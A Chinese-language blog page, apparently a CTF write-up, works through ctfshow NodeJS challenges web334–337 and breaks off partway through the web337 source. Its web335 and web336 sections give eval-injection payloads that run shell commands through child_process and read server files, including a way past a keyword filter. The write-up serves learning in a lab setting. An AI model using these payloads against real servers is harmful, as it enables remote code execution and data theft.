@@ -1,0 +1,505 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="NodeJS Node.js 是一个基于 Chrome V8 引擎的 JavaScript 运行时环境，可以让你用 JavaScript 来编写服务器端的代码。它提供了一个事件驱动的非阻塞 I&#x2F;O 模型，使其轻量又高效，非常适合在分布式设备上运行的数据密集型实时应用。Node.js 的包管理器 npm 也是非常强大和活跃的，拥有大量的开源包可以让开发者快速构建应用。  web334 ex">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfshow-web入门笔记-NodeJS">
+<meta property="og:url" content="http://example.com/2024/05/08/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-NodeJS/index.html">
+<meta property="og:site_name" content="ShuiChang厕纸博客站">
+<meta property="og:description" content="NodeJS Node.js 是一个基于 Chrome V8 引擎的 JavaScript 运行时环境，可以让你用 JavaScript 来编写服务器端的代码。它提供了一个事件驱动的非阻塞 I&#x2F;O 模型，使其轻量又高效，非常适合在分布式设备上运行的数据密集型实时应用。Node.js 的包管理器 npm 也是非常强大和活跃的，拥有大量的开源包可以让开发者快速构建应用。  web334 ex">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-05-07T16:16:33.000Z">
+<meta property="article:modified_time" content="2025-02-26T15:38:50.920Z">
+<meta property="article:author" content="ShuiChang">
+<meta property="article:tag" content="web学习">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>ctfshow-web入门笔记-NodeJS</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a href="/friends/">friends</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/ShuiChang2019">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/05/10/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-SSRF/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/05/05/Arm-Ubuntu%E6%8A%98%E7%A3%A8%E8%AE%B0/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/05/08/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-NodeJS/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/05/08/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-NodeJS/&text=ctfshow-web入门笔记-NodeJS"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/05/08/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-NodeJS/&title=ctfshow-web入门笔记-NodeJS"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/05/08/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-NodeJS/&is_video=false&description=ctfshow-web入门笔记-NodeJS"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ctfshow-web入门笔记-NodeJS&body=Check out this article: http://example.com/2024/05/08/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-NodeJS/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/05/08/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-NodeJS/&title=ctfshow-web入门笔记-NodeJS"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/05/08/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-NodeJS/&title=ctfshow-web入门笔记-NodeJS"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/05/08/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-NodeJS/&title=ctfshow-web入门笔记-NodeJS"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/05/08/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-NodeJS/&title=ctfshow-web入门笔记-NodeJS"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/05/08/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-NodeJS/&name=ctfshow-web入门笔记-NodeJS&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/05/08/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-NodeJS/&t=ctfshow-web入门笔记-NodeJS"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#NodeJS"><span class="toc-number">1.</span> <span class="toc-text">NodeJS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web334-express%E6%A1%86%E6%9E%B6%E5%88%9D%E6%8E%A2"><span class="toc-number">1.1.</span> <span class="toc-text">web334 express框架初探</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Express%E6%A1%86%E6%9E%B6-%E8%B7%AF%E7%94%B1%E5%99%A8%E5%AF%B9%E8%B1%A1"><span class="toc-number">1.1.1.</span> <span class="toc-text">Express框架 路由器对象</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web335-nodejs-eval"><span class="toc-number">1.2.</span> <span class="toc-text">web335 nodejs eval</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web336-nodejs-%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F-filename%E5%87%BD%E6%95%B0%E7%AD%89"><span class="toc-number">1.3.</span> <span class="toc-text">web336 nodejs 全局变量 __filename函数等</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nodejs%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F"><span class="toc-number">1.3.1.</span> <span class="toc-text">nodejs全局变量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nodejs-child-process%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">1.3.2.</span> <span class="toc-text">nodejs child_process执行命令的函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web337-nodejs-%E6%8B%BC%E6%8E%A5%E7%89%B9%E6%80%A7-md5%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.</span> <span class="toc-text">web337 nodejs 拼接特性 md5数组绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nodejs-%E6%8B%BC%E6%8E%A5"><span class="toc-number">1.4.1.</span> <span class="toc-text">nodejs 拼接</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web338-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93-express%E6%A1%86%E6%9E%B6"><span class="toc-number">1.5.</span> <span class="toc-text">web338 原型链污染 express框架</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nodejs-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-number">1.5.1.</span> <span class="toc-text">nodejs 原型链污染</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web339-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93-RCE%E5%92%8C%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.6.</span> <span class="toc-text">web339 原型链污染 RCE和反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web340-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93-%E5%90%91%E4%B8%8A%E6%B1%A1%E6%9F%93%E4%B8%A4%E7%BA%A7"><span class="toc-number">1.7.</span> <span class="toc-text">web340 原型链污染 向上污染两级</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web341-ejs%E6%BC%8F%E6%B4%9Erce"><span class="toc-number">1.8.</span> <span class="toc-text">web341 ejs漏洞rce</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web342-jade%E6%BC%8F%E6%B4%9Erce"><span class="toc-number">1.9.</span> <span class="toc-text">web342 jade漏洞rce</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web343-jade%E6%BC%8F%E6%B4%9Erce"><span class="toc-number">1.10.</span> <span class="toc-text">web343 jade漏洞rce</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web344-HPP"><span class="toc-number">1.11.</span> <span class="toc-text">web344 HPP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HPP%EF%BC%88HTTP-Parameter-Pollution%EF%BC%89%EF%BC%9A-HPP%E6%95%B0%E6%8D%AE%E6%B1%A1%E6%9F%93"><span class="toc-number">1.11.1.</span> <span class="toc-text">HPP（HTTP Parameter Pollution）： HPP数据污染</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E9%AA%8C%E8%AF%81HPP"><span class="toc-number">1.11.2.</span> <span class="toc-text">动态调试验证HPP</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        ctfshow-web入门笔记-NodeJS
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">ShuiChang</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-05-07T16:16:33.000Z" class="dt-published" itemprop="datePublished">2024-05-08</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/web%E5%AD%A6%E4%B9%A0/" rel="tag">web学习</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="NodeJS"><a href="#NodeJS" class="headerlink" title="NodeJS"></a>NodeJS</h1><blockquote>
+<p>Node.js 是一个基于 Chrome V8 引擎的 JavaScript 运行时环境，可以让你用 JavaScript 来编写服务器端的代码。它提供了一个事件驱动的非阻塞 I&#x2F;O 模型，使其轻量又高效，非常适合在分布式设备上运行的数据密集型实时应用。Node.js 的包管理器 npm 也是非常强大和活跃的，拥有大量的开源包可以让开发者快速构建应用。</p>
+</blockquote>
+<h2 id="web334-express框架初探"><a href="#web334-express框架初探" class="headerlink" title="web334 express框架初探"></a>web334 express框架初探</h2><p>下载源代码，是两个js文件。</p>
+<p>login.js:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>); <span class="comment">//引入express框架</span></span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>(); <span class="comment">//创建路由器对象</span></span><br><span class="line"><span class="keyword">var</span> users = <span class="built_in">require</span>(<span class="string">&#x27;../modules/user&#x27;</span>).<span class="property">items</span>; <span class="comment">//引入了一个用户模块，并将其赋值给 users 变量</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">var</span> findUser = <span class="keyword">function</span>(<span class="params">name, password</span>)&#123; <span class="comment">//定义findUser函数，接受name, password参数</span></span><br><span class="line">  <span class="keyword">return</span> users.<span class="title function_">find</span>(<span class="keyword">function</span>(<span class="params">item</span>)&#123; </span><br><span class="line">    <span class="keyword">return</span> name!==<span class="string">&#x27;CTFSHOW&#x27;</span> &amp;&amp; item.<span class="property">username</span> === name.<span class="title function_">toUpperCase</span>() &amp;&amp; item.<span class="property">password</span> === password;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page. */</span></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123; <span class="comment">//post处理函数</span></span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>); </span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> sess = req.<span class="property">session</span>; <span class="comment">//获取会话对象</span></span><br><span class="line">  <span class="keyword">var</span> user = <span class="title function_">findUser</span>(req.<span class="property">body</span>.<span class="property">username</span>, req.<span class="property">body</span>.<span class="property">password</span>);</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span>(user)&#123;</span><br><span class="line">    req.<span class="property">session</span>.<span class="title function_">regenerate</span>(<span class="keyword">function</span>(<span class="params">err</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span>(err)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">2</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;登录失败&#x27;</span>&#125;);        </span><br><span class="line">      &#125;</span><br><span class="line">       </span><br><span class="line">      req.<span class="property">session</span>.<span class="property">loginUser</span> = user.<span class="property">username</span>;</span><br><span class="line">      res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">0</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;登录成功&#x27;</span>,<span class="attr">ret_flag</span>:flag&#125;);              </span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">1</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;账号或密码错误&#x27;</span>&#125;);</span><br><span class="line">  &#125;  </span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router; <span class="comment">//将定义的路由器对象 &quot;router&quot; 导出，以便其他模块可以使用这个路由器对象。</span></span><br></pre></td></tr></table></figure>
+
+
+<p>user.js:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">items</span>: [</span><br><span class="line">    &#123;<span class="attr">username</span>: <span class="string">&#x27;CTFSHOW&#x27;</span>, <span class="attr">password</span>: <span class="string">&#x27;123456&#x27;</span>&#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>这段代码定义了一个简单的模块，导出一个包含一个用户对象的数组。每个用户对象包含 username 和 password 属性。这个模块的作用是提供一个用户数据源，用于在认证接口中查找用户信息。与之前的代码关系是，认证接口中的 findUser 函数使用了这个模块导出的 items 数组作为用户数据源。在认证时，会根据传入的用户名和密码在这个数组中查找匹配的用户对象。如果找到匹配的用户对象，就认为认证成功，否则认证失败。</p>
+<p>这里读完了代码，发现是用户名uppercase后需要和<code>CTFSHOW</code>一致，用户名又不能等于<code>CTFSHOW</code>，密码就是<code>123456</code>。直接用户名全小写后加入密码即可。</p>
+<h3 id="Express框架-路由器对象"><a href="#Express框架-路由器对象" class="headerlink" title="Express框架 路由器对象"></a>Express框架 路由器对象</h3><blockquote>
+<p>路由器对象在 Express 中用于定义和管理应用的路由。路由器对象可以看作是一个中间件（middleware），用于处理特定路径下的 HTTP 请求。在 Express 中，路由器对象可以使用 express.Router() 方法创建。</p>
+</blockquote>
+<blockquote>
+<p>通过路由器对象，可以将不同路径下的请求分发到不同的处理函数中，实现更好的代码组织和维护。例如，可以将所有与用户相关的请求（如登录、注册、个人信息等）分发到一个用户路由器对象中，将与商品相关的请求分发到另一个商品路由器对象中，以此类推。</p>
+</blockquote>
+<blockquote>
+<p>路由器对象的基本用法是使用 router.METHOD() 方法（其中 METHOD 是 HTTP 请求方法，如 GET、POST、PUT、DELETE 等）定义路由，并指定对应的处理函数。例如，router.get(‘&#x2F;‘, function(req, res) { … }) 定义了一个处理 GET 请求的路由。</p>
+</blockquote>
+<blockquote>
+<p>最后，将路由器对象通过 module.exports 导出，以便在应用的主文件中使用 app.use() 方法将路由器对象挂载到应用的特定路径上，使得该路由器对象能够处理该路径下的请求。</p>
+</blockquote>
+<h2 id="web335-nodejs-eval"><a href="#web335-nodejs-eval" class="headerlink" title="web335 nodejs eval"></a>web335 nodejs eval</h2><p>f12看源代码，发现了提示：<code>/?eval=</code>。</p>
+<blockquote>
+<p>在 Node.js 中，eval() 函数用于将传入的字符串当作 JavaScript 代码来执行。它接受一个字符串参数，然后将这个字符串作为 JavaScript 代码在当前作用域中执行。eval() 函数可以动态地执行代码，这意味着可以在运行时构建代码字符串，并通过 eval() 函数执行。</p>
+</blockquote>
+<p>看了<a target="_blank" rel="noopener" href="https://forum.butian.net/share/1631">几篇文章</a>和一个<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42880719/article/details/122567506">wp</a>，构造了这样的payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?eval=equire(&quot;child_process&quot;).execSync(&#x27;ls&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>使用了<code>child_process</code>下的<code>execSync</code>来创建子进程。用<code>exec()</code>时会出现无回显的情况。</p>
+<blockquote>
+<p>execSync 是同步执行命令的方法，会阻塞 Node.js 事件循环，直到命令执行完成才会继续执行后续代码。因此，在执行长时间运行的命令时，会导致 Node.js 应用程序无法响应其他事件。<br>exec 是异步执行命令的方法，不会阻塞事件循环，而是在命令执行完成后通过回调函数来处理结果。因此，推荐在大多数情况下使用 exec 方法，以避免阻塞事件循环。 </p>
+</blockquote>
+<h2 id="web336-nodejs-全局变量-filename函数等"><a href="#web336-nodejs-全局变量-filename函数等" class="headerlink" title="web336 nodejs 全局变量 __filename函数等"></a>web336 nodejs 全局变量 __filename函数等</h2><p>直接用上一道题的payload不行。</p>
+<h3 id="nodejs全局变量"><a href="#nodejs全局变量" class="headerlink" title="nodejs全局变量"></a>nodejs全局变量</h3><blockquote>
+<p>在 Node.js 中，__filename 和 __dirname 是两个特殊的全局变量，用于获取当前文件的文件名和所在目录的绝对路径。</p>
+</blockquote>
+<ul>
+<li><code>__filename</code>：表示当前文件的绝对路径，包括文件名。</li>
+<li><code>__dirname</code>：表示当前文件所在目录的绝对路径，不包括文件名。</li>
+</ul>
+<blockquote>
+<p>除了 <code>__filename</code> 和 <code>__dirname</code>，Node.js 还提供了一些其他的全局变量，其中一些是常见的 Node.js 环境下特有的，可以在任何地方直接使用。以下是一些常见的全局变量：</p>
+</blockquote>
+<ul>
+<li><code>global</code>：全局对象，类似于浏览器环境中的 <code>window</code> 对象。在任何地方都可以使用，用于定义全局变量和函数。</li>
+<li><code>process</code>：表示当前 Node.js 进程的全局对象，可以通过它来获取进程信息、设置环境变量等。</li>
+<li><code>console</code>：用于在控制台输出信息的全局对象，可以使用 <code>console.log()</code>、<code>console.error()</code> 等方法输出信息。</li>
+<li><code>Buffer</code>：用于处理二进制数据的全局对象，可以用来创建 <code>Buffer</code> 对象，处理文件、网络数据等。<br>除了以上几个常见的全局变量外，还有一些其他的全局变量，如 <code>setTimeout</code>、<code>setInterval</code>、<code>require</code> 等，它们也可以在任何地方直接使用。</li>
+</ul>
+<p>首先使用<code>/?eval=__filename</code>看一下路径，发现是<code>/app/routes/index.js</code>。</p>
+<p>然后读文件。<code>eval=require(&#39;fs&#39;).readFileSync(&#39;/app/routes/index.js&#39;)</code>，读取出<code>/app/routes/index.js</code>。</p>
+<p>找个<a target="_blank" rel="noopener" href="https://toolgg.com/javascript-beautifier.html">在线工具</a>美化一下。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>(); <span class="comment">/* GET home page. */</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">	res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">	<span class="keyword">var</span> evalstring = req.<span class="property">query</span>.<span class="property">eval</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_">typeof</span>(evalstring) == <span class="string">&#x27;string&#x27;</span> &amp;&amp; evalstring.<span class="title function_">search</span>(<span class="regexp">/exec|load/i</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123;</span><br><span class="line">			<span class="attr">title</span>: <span class="string">&#x27;tql&#x27;</span></span><br><span class="line">		&#125;);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123;</span><br><span class="line">			<span class="attr">title</span>: <span class="built_in">eval</span>(evalstring)</span><br><span class="line">		&#125;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure>
+<p>一看，<code>evalstring.search(/exec|load/i) &gt; 0)</code>屏蔽了exec和load的大小写。</p>
+<p>换一种：</p>
+<h3 id="nodejs-child-process执行命令的函数"><a href="#nodejs-child-process执行命令的函数" class="headerlink" title="nodejs child_process执行命令的函数"></a>nodejs child_process执行命令的函数</h3><ul>
+<li>exec(command[, options][, callback])：异步执行一个 shell 命令，通过回调函数处理结果。与 execSync 不同，这个方法不会阻塞事件循环。</li>
+<li>execFile(file[, args][, options][, callback])：类似于 exec，但是直接执行一个可执行文件而不是通过 shell。这个方法更加高效，因为不需要启动一个新的 shell 进程。</li>
+<li>spawn(command[, args][, options])：以流的形式启动一个子进程来执行命令，可以方便地处理命令的输入和输出。适用于需要交互式地处理子进程的情况。</li>
+<li>fork(modulePath[, args][, options])：衍生一个新的 Node.js 进程，并在其中执行指定的模块。与 spawn 不同的是，fork 方法创建的子进程是一个独立的 Node.js 进程，可以方便地进行进程间通信。</li>
+</ul>
+<p>同时，exec和spawn有</p>
+<ul>
+<li>execSync()</li>
+<li>spawnSync()<br>fork没有。</li>
+</ul>
+<p>最后得到payload：<code>/?eval=require(&#39;child_process&#39;).spawnSync(&#39;ls&#39;).stdout.toString()</code>其中，<code>.stdout.toString()</code>将命令的标准输出转换为字符串。</p>
+<h2 id="web337-nodejs-拼接特性-md5数组绕过"><a href="#web337-nodejs-拼接特性-md5数组绕过" class="headerlink" title="web337 nodejs 拼接特性 md5数组绕过"></a>web337 nodejs 拼接特性 md5数组绕过</h2><p>得到提示：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">var</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">md5</span>(<span class="params">s</span>) &#123; </span><br><span class="line">  <span class="keyword">return</span> crypto.<span class="title function_">createHash</span>(<span class="string">&#x27;md5&#x27;</span>) <span class="comment">// 创建md5 hash对象</span></span><br><span class="line">    .<span class="title function_">update</span>(s) <span class="comment">// 将输入字符串放到hash对象中处理</span></span><br><span class="line">    .<span class="title function_">digest</span>(<span class="string">&#x27;hex&#x27;</span>); <span class="comment">// 以十六进制输出</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page. */</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;xxxxxxx&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> a = req.<span class="property">query</span>.<span class="property">a</span>;</span><br><span class="line">  <span 